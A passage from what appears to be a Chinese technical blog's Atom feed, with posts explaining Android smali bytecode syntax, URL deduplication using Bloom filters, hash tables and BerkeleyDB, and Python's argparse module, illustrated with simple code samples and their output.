class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//===================================================================</span><br><span class="line">public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123;</span><br><span class="line">    // ......</span><br><span class="line">&#125;</span><br><span class="line">//=========smali文件头====================================================</span><br><span class="line">.class public Ltestdemo/hpp/cn/test/MainActivity;</span><br><span class="line">.super Landroid/support/v7/app/AppCompatActivity;</span><br><span class="line">.source &quot;MainActivity.java&quot;</span><br><span class="line">.implements Landroid/view/View$OnClickListener;</span><br><span class="line">//===================================================================</span><br></pre></td></tr></table></figure><p>.class &lt;访问权限&gt; [关键修饰字] &lt;类名&gt;;<br>.super &lt;父类名&gt;;<br>.source &lt;源文件名&gt;<br>.implements &lt;接口名&gt;</p><h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p>共有12种判断语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if-eq vA, VB, cond_** 如果vA等于vB则跳转到cond_**。相当于if (vA==vB)</span><br><span class="line">if-ne vA, VB, cond_** 如果vA不等于vB则跳转到cond_**。相当于if (vA!=vB)</span><br><span class="line">if-lt vA, VB, cond_** 如果vA小于vB则跳转到cond_**。相当于if (vA&lt;vB)</span><br><span class="line">if-le vA, VB, cond_** 如果vA小于等于vB则跳转到cond_**。相当于if (vA&lt;=vB)</span><br><span class="line">if-gt vA, VB, cond_** 如果vA大于vB则跳转到cond_**。相当于if (vA&gt;vB)</span><br><span class="line">if-ge vA, VB, cond_** 如果vA大于等于vB则跳转到cond_**。相当于if (vA&gt;=vB)</span><br><span class="line"></span><br><span class="line">if-eqz vA, :cond_** 如果vA等于0则跳转到:cond_** 相当于if (VA==0)</span><br><span class="line">if-nez vA, :cond_** 如果vA不等于0则跳转到:cond_**相当于if (VA!=0)</span><br><span class="line">if-ltz vA, :cond_** 如果vA小于0则跳转到:cond_**相当于if (VA&lt;0)</span><br><span class="line">if-lez vA, :cond_** 如果vA小于等于0则跳转到:cond_**相当于if (VA&lt;=0)</span><br><span class="line">if-gtz vA, :cond_** 如果vA大于0则跳转到:cond_**相当于if (VA&gt;0)</span><br><span class="line">if-gez vA, :cond_** 如果vA大于等于0则跳转到:cond_**相当于if (VA&gt;=0)</span><br></pre></td></tr></table></figure></p><h3 id="其它基本指令"><a href="#其它基本指令" class="headerlink" title="其它基本指令"></a>其它基本指令</h3><p>smali字节码类似于汇编<br>.method　　方法<br>.end method　　函数结束<br>.parameter　　方法参数<br>.prologue　　方法开始<br>.line 12　　此方法位于第12行<br>.field private isFlag:z　　定义变量<br>move v0, v3 把v3寄存器的值移动到寄存器v0上<br>const-string v0, “MainActivity” 把字符串”MainActivity”赋值给v0寄存器<br>const/high16  v0, 0x7fo3　　把0x7fo3赋值给v0<br>invoke-super　　调用父函数<br>return-void　　函数返回void<br>new-instance　　创建实例<br>iput-object　　对象赋值<br>iget-object　　调用对象<br>invoke-static　　调用静态函数<br>invoke-direct　　调用函数</p><p>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">//===================================================================</span><br><span class="line">@Override</span><br><span class="line">public void onClick(View view) &#123;</span><br><span class="line">    String str = &quot;Hello World!&quot;;</span><br><span class="line">    print(str);</span><br><span class="line">&#125;</span><br><span class="line">//===================================================================</span><br><span class="line"># virtual methods</span><br><span class="line"># 参数类型为Landroid/view/View，返回类型为V</span><br><span class="line">.method public onClick(Landroid/view/View;)V</span><br><span class="line">    # 表示有三个寄存器</span><br><span class="line">    .registers 3</span><br><span class="line">    # 参数View类型的view变量对应的是寄存器p1</span><br><span class="line">    .param p1, &quot;view&quot;    # Landroid/view/View;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 24</span><br><span class="line">    #将&quot;Hello World!&quot;字符串放到寄存器v0中</span><br><span class="line">    const-string v0, &quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">    .line 25</span><br><span class="line">    # 定义一个Ljava/lang/String类型的str变量对应本地寄存器v0</span><br><span class="line">    .local v0, &quot;str&quot;:Ljava/lang/String;</span><br><span class="line">    # 调用该类的print方法，该方法的参数类型为Ljava/lang/String，返回值为V</span><br><span class="line">    # 调用print方法传入的参数为&#123;p0, v0&#125;，及print(p0, v0)，p0为this，v0为&quot;Hello World!&quot;字符串</span><br><span class="line">    invoke-direct &#123;p0, v0&#125;, Ltestdemo/hpp/cn/annotationtest/MainActivity;-&gt;print(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">    .line 26</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line">//===================================================================</span><br></pre></td></tr></table></figure></p><p>参考文章：<br><a href="https://blog.csdn.net/hp910315/article/details/51823236" target="_blank" rel="noopener">静态分析Android程序——smali文件解析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Dalvik&quot;&gt;&lt;a href=&quot;#Dalvik&quot; class=&quot;headerlink&quot; title=&quot;Dalvik&quot;&gt;&lt;/a&gt;Dalvik&lt;/h2&gt;&lt;p&gt;DVM运行Dalvik字节码，可执行文件格式dex(dalvik executable)，有点类似于机器码。DVM基于寄存器，JVM基于栈。&lt;/p&gt;
&lt;h2 id=&quot;smali语法&quot;&gt;&lt;a href=&quot;#smali语法&quot; class=&quot;headerlink&quot; title=&quot;smali语法&quot;&gt;&lt;/a&gt;smali语法&lt;/h2&gt;
    
    </summary>
    
      <category term="逆向" scheme="https://fl4g.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://fl4g.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="android" scheme="https://fl4g.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>URL去重去似</title>
    <link href="https://fl4g.cn/2018/05/24/url%E5%8E%BB%E9%87%8D%E5%8E%BB%E4%BC%BC/"/>
    <id>https://fl4g.cn/2018/05/24/url去重去似/</id>
    <published>2018-05-24T01:48:54.000Z</published>
    <updated>2020-09-02T07:53:18.449Z</updated>
    
    <content type="html"><![CDATA[<h2 id="URL去重"><a href="#URL去重" class="headerlink" title="URL去重"></a>URL去重</h2><p>URL去重主要有两种方式：</p><ul><li>布隆过滤器去重</li><li><p>Hash表去重</p><a id="more"></a><h3 id="布隆过滤器去重"><a href="#布隆过滤器去重" class="headerlink" title="布隆过滤器去重"></a>布隆过滤器去重</h3><ol><li>需要一个数组和k个映射函数，初始将数组array所有位置都置0。</li><li>将元素集S={s1,s2……sn}中每个元素sj，通过k个映射函数{f1,f2……fk}映射为K个值{g1，g2……gk},将array中对应的array[g1],array[g2]……array[gk]置为1.</li><li>若元素item通过映射函数得到的k个值在array中对应的值全为1，则item在S中，否则不在。</li></ol><p>python有两个第三方插件实现了此功能：</p><ul><li>Python-bloomfilter<br>项目地址:<a href="https://github.com/jaybaird/Python-bloomfilter" target="_blank" rel="noopener">https://github.com/jaybaird/Python-bloomfilter</a></li><li>Pybloomfiltermmap<br>项目地址:<a href="https://github.com/axiak/Pybloomfiltermmap" target="_blank" rel="noopener">https://github.com/axiak/Pybloomfiltermmap</a><br>官方文档:<a href="https://axiak.github.io/pybloomfiltermmap/" target="_blank" rel="noopener">https://axiak.github.io/pybloomfiltermmap/</a></li></ul><p>Pybloomfiltermmap模块实现两类布隆过滤器：Bloomfilter和ScalableBloomfilter。<br>Bloomfilter是一个定容过滤器，error_rate指最大误报率；<br>ScalableBloomfilter是一个不定容过滤器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pybloomfilter <span class="keyword">import</span> BloomFilter</span><br><span class="line"><span class="comment"># 创建一个capacity等于100万，error rate等于0.001的bloomfilter对象</span></span><br><span class="line">bfilter = BloomFilter(<span class="number">1000000</span>,<span class="number">0.001</span>,<span class="string">'bf_test.bloom'</span>)</span><br></pre></td></tr></table></figure><p>方法add是添加元素，若元素已存在，则返回True，若不存在则返回False，并添加到过滤器中。</p><p>布隆过滤器存在一定的误判率。</p><h3 id="Hash表去重"><a href="#Hash表去重" class="headerlink" title="Hash表去重"></a>Hash表去重</h3><p>遍历URL列表，判断每个URL是否在去重后的列表里，如果不在，则加入列表。根据哈希表存放的位置，可以分为两种方式：一种是基于内存的Hash表去重；一种是基于硬盘的Hash表去重。</p><h4 id="方法一：利用内存Hash表去重"><a href="#方法一：利用内存Hash表去重" class="headerlink" title="方法一：利用内存Hash表去重"></a>方法一：利用内存Hash表去重</h4><p>使用如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">  <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">    result.append(url)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>由于URL长度不固定，单个URL长度越长，使用URL存储内存和性能损耗过快，此时需对URL进行Hash运算压缩，如：16位md5运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 2.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">print</span> hashlib.md5(<span class="string">"hello"</span>).hexdigest()[<span class="number">8</span>:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">print(hashlib.md5(<span class="string">"hello"</span>.encode(<span class="string">'utf-8'</span>)).hexdigest())[<span class="number">8</span>:<span class="number">-8</span>]</span><br></pre></td></tr></table></figure><h4 id="方法二：利用BerkeleyDB去重"><a href="#方法二：利用BerkeleyDB去重" class="headerlink" title="方法二：利用BerkeleyDB去重"></a>方法二：利用BerkeleyDB去重</h4><p>BerkeleyDB是一个key-value database，简单的说，就是一个在disk上的hash表。存储的是“key-value”键值对。<br>下载安装Berkeley DB安装。Python需要安装bsddb3模块来提供BerkeleyDB数据库的操作接口。<br>Berkeley DB次你在四种数据访问模式：</p><ul><li>btree：树结构，存储任意复杂key和value</li><li>hash：hash存储，访问量巨大时，效果好</li><li>queue：队列操作，只能存储定长数据，key必须是数字</li><li>recno：与queue相似，但支持边长value</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bsddb</span><br><span class="line">mydb = bsddb.db.DB()</span><br><span class="line">mydb.open(<span class="string">'mydb.db'</span>,dbtype = bsddb.db.DB_HASH, flags = bsddb.db.DB_CREATE)</span><br><span class="line">mydb.put(<span class="string">"key"</span>,<span class="string">"value"</span>)</span><br><span class="line">mydb.close()</span><br></pre></td></tr></table></figure><p>设置数据访问方法：<br>btree是 bsddb.db.DB_BTREE， hash是bsddb.db.DB_HASH<br>queu 是 bsddb.db.DB_QUEUE,  recno 是bsddb.db.DB_RECNO<br>设置flags参数为DB_CREATE表明如果数据文件不存在则新建一个空的数据文件。<br>使用DB的put方法存储一个Key/Value对</p></li></ul><h2 id="URL去似去含"><a href="#URL去似去含" class="headerlink" title="URL去似去含"></a>URL去似去含</h2><p>相似URL特征：</p><ul><li>协议相同（protocol）</li><li>主机名相同（host）</li><li>端口相同（port）</li><li>资源路劲相同（path）</li><li>参数名所组成列表相同或包含</li></ul><p>python2.x使用urlparse，python3.x使用urllib，以python2.x为例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line">url=<span class="string">'http://www.baidu.com:80/s?wd=python&amp;ie=utf-8#123'</span></span><br><span class="line">r=urlparse.urlparse(url)</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line"><span class="keyword">print</span> r.netloc</span><br><span class="line"><span class="keyword">print</span> r.hostname</span><br><span class="line"><span class="keyword">print</span> r.port</span><br><span class="line"><span class="keyword">print</span> urlparse.parse_qs(r.query)</span><br><span class="line">res = urlparse.urlsplit(url)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com:80'</span>, path=<span class="string">'/s'</span>, params=<span class="string">''</span>, query=<span class="string">'wd=python&amp;ie=utf-8'</span>, fragment=<span class="string">'123'</span>)</span><br><span class="line">www.baidu.com:80</span><br><span class="line">www.baidu.com</span><br><span class="line">80</span><br><span class="line">SplitResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com:80'</span>, path=<span class="string">'/s'</span>, query=<span class="string">'wd=python&amp;ie=utf-8'</span>, fragment=<span class="string">'123'</span>)</span><br></pre></td></tr></table></figure></p><p>r = urlparse.urlparse(url)返回一个6个元组，分别为scheme, netloc, path, params, query, fragment，ParseResult类还有几个常用方法：<br>res.username<br>res.password<br>res.hostname<br>res.port<br>res.geturl()<br>urlunparse与之相反,将6个元组组成一个string。<br>urlsplit将path与params合并为path，存在urlunsplit与之相反功能。<br>使用urlparse.parse_qs()函数获取r.query中的参数列表，输出为字典。<br><strong>注释：url必须以<em><a href="http://xxx" target="_blank" rel="noopener">http://xxx</a></em>开头,否则会出错。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;URL去重&quot;&gt;&lt;a href=&quot;#URL去重&quot; class=&quot;headerlink&quot; title=&quot;URL去重&quot;&gt;&lt;/a&gt;URL去重&lt;/h2&gt;&lt;p&gt;URL去重主要有两种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;布隆过滤器去重&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Hash表去重&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
      <category term="python" scheme="https://fl4g.cn/categories/python/"/>
    
    
      <category term="爬虫" scheme="https://fl4g.cn/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="url" scheme="https://fl4g.cn/tags/url/"/>
    
  </entry>
  
  <entry>
    <title>python学习-argparse模块</title>
    <link href="https://fl4g.cn/2018/05/14/python%E5%AD%A6%E4%B9%A0-argparse%E6%A8%A1%E5%9D%97/"/>
    <id>https://fl4g.cn/2018/05/14/python学习-argparse模块/</id>
    <published>2018-05-14T07:28:37.000Z</published>
    <updated>2020-09-02T07:53:18.449Z</updated>
    
    <content type="html"><![CDATA[<p>  argparse模块是python中用于解析命令行参数和选项的标准模块，方便用户在命令行中输入参数。</p><h2 id="argparse使用"><a href="#argparse使用" class="headerlink" title="argparse使用"></a>argparse使用</h2><a id="more"></a><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>先看一个简单的例子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.parse_args()</span><br></pre></td></tr></table></figure></p><ul><li>创建 ArgumentParser() 对象</li><li>使用 parse_args() 解析</li></ul><p>将上述代码保存并命名为test.py,运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">$ python test.py -h</span><br><span class="line">usage: t.py [-h]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br></pre></td></tr></table></figure></p><ul><li>不添加任何参数，无回显</li><li>添加-h参数，获取帮助，-h为默认预设参数</li></ul><h3 id="ArgumentParser函数解析"><a href="#ArgumentParser函数解析" class="headerlink" title="ArgumentParser函数解析"></a>ArgumentParser函数解析</h3><p>  使用help(argparse.ArgumentParser())查看函数帮助，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class ArgumentParser(_AttributeHolder, _ActionsContainer)</span><br><span class="line"> |  Object <span class="keyword">for</span> parsing <span class="built_in">command</span> line strings into Python objects.</span><br><span class="line"> |</span><br><span class="line"> |  Keyword Arguments:</span><br><span class="line"> |      - prog -- The name of the program (default: sys.argv[0])</span><br><span class="line"> |      - usage -- A usage message (default: auto-generated from arguments)</span><br><span class="line"> |      - description -- A description of what the program does</span><br><span class="line"> |      - epilog -- Text following the argument descriptions</span><br><span class="line"> |      - parents -- Parsers whose arguments should be copied into this one</span><br><span class="line"> |      - formatter_class -- HelpFormatter class <span class="keyword">for</span> printing <span class="built_in">help</span> messages</span><br><span class="line"> |      - prefix_chars -- Characters that prefix optional arguments</span><br><span class="line"> |      - fromfile_prefix_chars -- Characters that prefix files containing</span><br><span class="line"> |          additional arguments</span><br><span class="line"> |      - argument_default -- The default value <span class="keyword">for</span> all arguments</span><br><span class="line"> |      - conflict_handler -- String indicating how to handle conflicts</span><br><span class="line"> |      - add_help -- Add a -h/-<span class="built_in">help</span> option</span><br><span class="line"> |</span><br><span class="line">......</span><br><span class="line"> |</span><br><span class="line"> |  Methods defined here:</span><br><span class="line"> |</span><br><span class="line"> |  __init__(self, prog=None, usage=None, description=None, epilog=None, version=None, parents=[], formatter_class=&lt;class <span class="string">'argparse.HelpFormatter'</span>&gt;, prefix_chars=<span class="string">'-'</span>, fromfile_prefix_chars=None, argument_default=None, conflict_handler=<span class="string">'error'</span>, add_help=True)</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure></p><p>常用参数解析：</p><ul><li>prog：程序名（默认为sys.argv[0]）</li><li>usage：程序的使用用例，默认情况下会自动生成</li><li>description：简短的描述这个程序的用途，help参数之前显示的信息。</li><li>parents：ArgumentParser对象组成列表，这些对象中的参数也要包含进来。</li><li>formatter_class：一个自定义帮助信息格式化输出的类。</li><li>prefix_chars：可选参数之前的前缀（默认为-)。</li><li>fromfile_prefix_chars：如果是从文件中读取参数，这个文件名参数的前缀（默认为None）。</li><li>conflict_handler：通常不需要，定义了处理冲突选项的策略。</li></ul><h3 id="add-argument-方法"><a href="#add-argument-方法" class="headerlink" title="add_argument() 方法"></a>add_argument() 方法</h3><p>使用add_argument()方法，用来定义程序可接受的命令行参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])</span><br></pre></td></tr></table></figure></p><ul><li>name or flags - 选项字符串的名字或者列表，例如 foo 或者 -f, –foo。</li><li>action - 命令行中该参数存在时的操作，默认值是 store<ul><li>store_ture，表示赋值为true；</li><li>append，将遇到的值存储成列表，也就是如果参数重复则会保存多个值;</li><li>append_const，将参数规范中定义的一个值保存到一个列表；</li><li>count，存储遇到的次数；</li></ul></li><li>default - 不指定参数时的默认值；</li><li>nargs - 应该读取的命令行参数个数，可以是具体的数字，或者是?号，当不指定值时对于 Positional argument 使用 default，对于 Optional argument 使用 const；或者是 * 号，表示 0 或多个参数；或者是 + 号表示 1 或多个参数。</li><li>required - 可选参数是否可以省略 (仅针对可选参数),默认为False；</li><li>const - action 和 nargs 所需要的常量值。</li><li>metavar - 对于必选参数默认就是参数名称，对于可选参数默认是必须存在参数后；</li><li>dest - 解析后的参数名称，默认情况下，对于可选参数选取最长的名称，中划线转换为下划线。</li></ul><h3 id="添加位置参数"><a href="#添加位置参数" class="headerlink" title="添加位置参数"></a>添加位置参数</h3><p>先看如下例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"square"</span>, help=<span class="string">"display a square of a given number"</span>,</span><br><span class="line">                    type=int)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">print</span> args</span><br><span class="line"><span class="keyword">print</span> args.square**<span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">usage: test.py [-h] square</span><br><span class="line">t.py: error: too few arguments</span><br><span class="line"></span><br><span class="line">$ python test.py -h</span><br><span class="line">usage: test.py [-h] square</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  square      display a square of a given number</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">$ python test.py 3</span><br><span class="line">Namespace(square=3)</span><br><span class="line">9</span><br><span class="line">$ python test.py three</span><br><span class="line">usage: test.py [-h] square</span><br><span class="line">t.py: error: argument square: invalid int value: <span class="string">'three'</span></span><br></pre></td></tr></table></figure></p><ul><li>运行程序，就必须设置一个参数。</li><li>parse_args()方法获取Namespace。</li></ul><h3 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h3><p>通过两种方式指定</p><ol><li>通过<span style="background:#BDD3F7"> - </span>来指定短参数，如：<span style="background:#BDD3F7">-h</span></li><li>通过<span style="background:#BDD3F7"> – </span>来指定长参数，如：<span style="background:#BDD3F7">–help</span><br>修改test.py文件：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, prog=<span class="string">'python test.py &lt;OPTIONS&gt;'</span>,description=<span class="string">'test'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-a'</span>, <span class="string">'--all'</span>, help=<span class="string">"Perform all operations"</span>,metavar=<span class="string">'xx'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--dns'</span>, help=<span class="string">"Perform"</span>,required=<span class="keyword">False</span>, action=<span class="string">'store_true'</span>)</span><br><span class="line">par=parser.parse_args()</span><br><span class="line"><span class="keyword">print</span> vars(par)</span><br><span class="line"><span class="keyword">print</span> vars(par)[<span class="string">'all'</span>]</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> vars(par):</span><br><span class="line">    <span class="keyword">print</span> v</span><br><span class="line">    <span class="keyword">print</span> vars(par)[v]</span><br></pre></td></tr></table></figure></li></ol><p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">&#123;<span class="string">'all'</span>: None, <span class="string">'dns'</span>: False&#125;</span><br><span class="line">None</span><br><span class="line">all</span><br><span class="line">None</span><br><span class="line">dns</span><br><span class="line">False</span><br><span class="line">$ python test.py -h</span><br><span class="line">usage: python Stealth.py &lt;OPTIONS&gt; [-h] [-a xx] [-d]</span><br><span class="line"></span><br><span class="line">collect</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>       show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -a xx, --all xx  Perform all operations</span><br><span class="line">  -d, --dns        Perform</span><br><span class="line"></span><br><span class="line">$ python test.py -a</span><br><span class="line">usage: python Stealth.py &lt;OPTIONS&gt; [-h] [-a xx] [-d]</span><br><span class="line">python Stealth.py &lt;OPTIONS&gt;: error: argument -a/--all: expected one argument</span><br><span class="line">$ python test.py -a test1 -d</span><br><span class="line">&#123;<span class="string">'all'</span>: <span class="string">'test1'</span>, <span class="string">'dns'</span>: True&#125;</span><br><span class="line">test1</span><br><span class="line">all</span><br><span class="line">test1</span><br><span class="line">dns</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p><ul><li>存在metavar参数时，可选参数后必须接值</li><li>存在action=’store_true’，默认值为False</li><li>metavar和action=’store_true’不能共存</li></ul><h3 id="混合参数使用"><a href="#混合参数使用" class="headerlink" title="混合参数使用"></a>混合参数使用</h3><p>计算一个整数数列的最大值或求和：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'Process some integers.'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'integers'</span>, metavar=<span class="string">'N'</span>, type=int, nargs=<span class="string">'+'</span>,</span><br><span class="line">                   help=<span class="string">'an integer for the accumulator'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--sum'</span>, dest=<span class="string">'accumulate'</span>, action=<span class="string">'store_const'</span>,</span><br><span class="line">                   const=sum, default=max,</span><br><span class="line">                   help=<span class="string">'sum the integers (default: find the max)'</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(args.accumulate(args.integers))</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py 1 2 3 4</span><br><span class="line">4</span><br><span class="line">$ python test.py 1 2 3 4 --sum</span><br><span class="line">10</span><br></pre></td></tr></table></figure></p><p>上述示例使用accumulate来重命名sum参数，与下面代码实现功能一样：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 